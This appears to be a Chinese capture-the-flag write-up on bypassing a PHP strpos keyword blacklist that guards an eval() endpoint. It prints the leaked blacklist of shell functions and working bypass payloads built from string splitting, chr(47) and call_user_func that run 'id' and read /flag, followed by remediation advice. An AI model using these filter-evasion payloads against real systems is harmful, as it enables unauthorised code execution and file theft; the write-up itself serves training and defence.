### 3. 失败尝试一：命令执行函数被拦截（截图 03、04）

按常规 RCE 思路先试命令执行：

```
提交: system('id');    → ✕ 运行请求未通过安全校验
提交: exec('id');      → ✕ 运行请求未通过安全校验
```

- 失败原因：`system`、`exec` 这类敏感函数名被安全校验直接命中；
- 继续探边：`shell_exec` / `passthru` / `popen` / `proc_open` 逐一探测同样被拦（未逐一截图）；
- 如何调整：校验看起来是「关键词命中即拦」，先换读文件类函数试边界。

![失败尝试：exec 被安全校验拦截](screenshots/04-失败尝试-exec被拦截.png)

### 4. 失败尝试二：`readfile('/flag')` 同时命中两个敏感项（截图 05）

```
提交: readfile('/flag');   → ✕ 运行请求未通过安全校验
```

- 失败原因：路径里同时出现 `/` 与 `flag` 两个敏感子串，即便函数名 `readfile` 本身未被列入黑名单，也会因参数被命中而拦截；
- 同类探测：`fopen` / `file_get_contents` / `glob('/flag*')` / `scandir('/')` 等带 `/flag` 或 `/` 的写法同样被拦；
- 如何调整：需要「源码中不出现连续敏感子串」地构造路径——例如用字符编码拼出 `/` 与 `flag`。

![失败尝试：readfile 路径含斜杠与 flag 被拦截](screenshots/05-失败尝试-readfile路径含斜杠被拦截.png)

### 5. 失败尝试三：纯字面量与特殊符号同样被拦（截图 06、07）

```
提交: echo 'flag';   → ✕ 运行请求未通过安全校验
提交: $a=1;          → ✕ 运行请求未通过安全校验
```

- `echo 'flag'` 只是输出一个字符串字面量、毫无危险，却依然被拦——说明校验是**纯文本子串匹配**，不是语法/语义分析；
- `$` 也被拦（PHP 变量符号即敏感），此外 `cat`、反引号、`|`、`>`、`<` 等字面量也在名单内；这意味着「用变量存函数名」（如 `$f='system'`）这类写法同样不可行；
- 如何调整：既然规则是文本匹配，就往「源码里看不出敏感子串」的方向构造载荷。

![失败尝试：美元符号被拦截](screenshots/07-失败尝试-美元符号被拦截.png)

### 6. 读取源码：黑名单与匹配逻辑完全暴露（截图 08）

既然 `file_get_contents` 字面量未被拦截，直接读服务端源码：

```
提交: echo file_get_contents('index.php');
结果: ✓ 运行完成，回显完整 index.php 源码
```

关键源码（节选，原文）：

```php
// 载荷检测系统 — 关键词黑名单 + 执行
// flag 不硬编码于此；通过检测的载荷读取 /flag 后回显。

$code = $_POST['code'] ?? '';
$blacklist = ['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open',
              'cat', 'flag', '/', '|', '`', '$', '>', '<'];
if ($code !== '') {
    $blocked = false;
    foreach ($blacklist as $kw) {
        if (strpos($code, $kw) !== false) { $blocked = true; break; }
    }
    if ($blocked) { $verdict = 'blocked'; }
    else {
        $verdict = 'passed';
        ob_start();
        try { eval($code); } catch (Throwable $e) { echo '执行出错'; }
        $output = ob_get_clean();
    }
}
```

- 过滤规则是 `strpos` 大小写敏感的**子串匹配**，命中任一关键词即拦；通过后**原样 `eval`**——这就是漏洞根源；
- 黑名单本身并不完整：`readfile`、`file_get_contents`、`scandir`、`call_user_func`、`chr`、`print_r` 等均可直接使用（此前探边中 `phpinfo()`、`chr()`、`var_dump()` 等也都能过）；
- 敏感项可归纳为三类：危险函数名（`system`/`exec`/…）、读文件关键词（`flag`）、路径与特殊符号（`/`、`|`、反引号、`$`、`>`、`<`）；
- 由此得到三个必须绕过的点：①函数名 ②`/` 字符 ③`flag` 关键词。

![读取源码：黑名单与 strpos 匹配逻辑完全暴露](screenshots/08-读取源码泄露黑名单.png)

### 7. 构造绕过链：拆分 + 编码 + 动态调用（截图 09、10、11）

针对三个敏感点逐一构造并实测：

```php
// 1) 函数名拆分 + 动态调用 → 命令执行（system 被拆成 'sys'.'tem'，源码中无连续敏感串）
call_user_func('sys'.'tem','id');
// 输出: uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)

// 2) 用 chr(47) 构造 '/'，列出根目录条目
print_r(scandir(chr(47)));

// 3) 用 chr(47) + 拆分关键词构造路径，读取 flag
echo file_get_contents(chr(47).'fla'.'g');
// 输出: vmc{GU1lqOpdP4eAjnF5STYUAFcHe3iFvFKh}
```

- 三条要点分别对应：`'sys'.'tem'` 拆掉函数名；`chr(47)` 生成 `/`（字符码写法不含斜杠字符）；`'fla'.'g'` 拆掉 `flag` 关键词；运行时拼接复原出真实函数名与路径；
- 先验证执行身份（拿到 `uid=82(www-data)`），再列目录定位 flag 文件，最后读出内容——链条完整闭环；
- 补充：`print_r(scandir(chr(47)))` 的输出为较长数组，截图 10 的可视区域止于 `[4] => dev`，其后的条目未入镜；
- 说明：靶机步骤截图系提交完成后将同一段代码回填到输入框再截屏，结果区均为真实提交回显，未作其他改动。

## 总结与心得

### 漏洞原理

1. **直接 `eval` 用户提交的代码（根本缺陷）**：服务端把用户输入当作 PHP 代码执行，等价于把代码执行能力开放给任何访问者；`ob_start()` 与 `try…catch` 只影响回显与报错，不构成安全边界。
2. **黑名单 + `strpos` 子串匹配可被轻易绕过**：过滤只检查提交文本中是否出现固定子串，不理解语义、不还原运行时拼接。因此「拆分函数名（`'sys'.'tem'`）」「字符码构造（`chr(47)`）」「拆分关键词（`'fla'.'g'`）」中任意一种都能让敏感词从源码文本中消失、在运行时重新出现。
3. **黑名单天然不完整**：`readfile`、`file_get_contents`、`scandir`、`call_user_func`、`chr` 均未列入；即便名单列得更长，仍有大小写、编码、动态调用等无穷变体，黑名单机制注定滞后。
4. **与「免杀」的对应**：本题名为「免杀 payload 制作」，考的就是把「静态特征可见」变成「运行时才可见」——拆分、字符编码、动态调用三种手法与免杀中对抗特征码检测的思路同构（对应 AI 问答 1–4）。

### 做题方法

- **先探边、后读源码**：用最小样例逐项探测（`system` → `exec` → `readfile('/flag')` → `echo 'flag'` → `$a=1`），归纳出「危险函数名 + `flag` + `/` + 特殊符号」的过滤轮廓；
- **读源码实证而非猜测**：发现 `file_get_contents` 可用后直接读 `index.php`，拿到黑名单与 `strpos` 匹配逻辑，利用方案随之确定（三个敏感点：函数名、`/`、`flag`）；
- **逐个敏感点构造绕过**：函数名拆分 + `call_user_func` 动态调用 → `chr(47)` 造 `/` → 关键词拆分；每一步都在靶机上验证（先 `id` 确认执行，再列目录，最后读文件）；
- **留替代路径复核**：`file_get_contents` 与 `readfile` 两条读文件路径均验证成功，排除单点偶然；
- **失败尝试有信息量**：函数名被拦 → 换读文件函数；路径被拦 → 认识到「敏感项组合命中」；字面量被拦 → 确认是子串匹配而非语义分析；`$` 被拦 → 排除变量函数写法，改用 `call_user_func`。

### 修复建议

- **不要把 `eval` 暴露给用户输入（第一优先级）**：在线代码运行环境应移除 `eval`/`assert` 类执行原语；确有需求时改为受限沙箱（容器 + 命名空间/seccomp + 只读根文件系统 + 独立低权用户 + CPU/内存/超时配额），且沙箱内**不应能读到 `/flag` 等敏感文件**；
- **过滤不要依赖黑名单子串匹配**：黑名单既拦不全（漏掉 `readfile` 等），也拦不准（误伤 `echo 'flag'`，却放过全部绕过变体）；如必须检查，应做语法级分析（如 `token_get_all` 解析后按函数/路径白名单放行），并对动态调用、字符串拼接、字符码函数（`chr`）等高风险构造单独设卡；
- **敏感资产隔离**：flag/凭据不放在代码执行进程可读的路径，或按最小权限拆分文件与进程权限；试验场实例应一次性使用并与生产网络隔离；
- **启用审计与监控**：记录每次提交的代码与响应，对 `chr(`、字符串拼接、动态函数调用等模式告警；结合系统层面检测异常子进程与文件读取行为（呼应 AI 问答 6 的「行为监控/动态分析」建议）；
- **若已暴露，做应急排查**：检查 web 目录是否被落地 webshell、进程树中是否有可疑子进程、是否有异常外连，必要时重建实例。
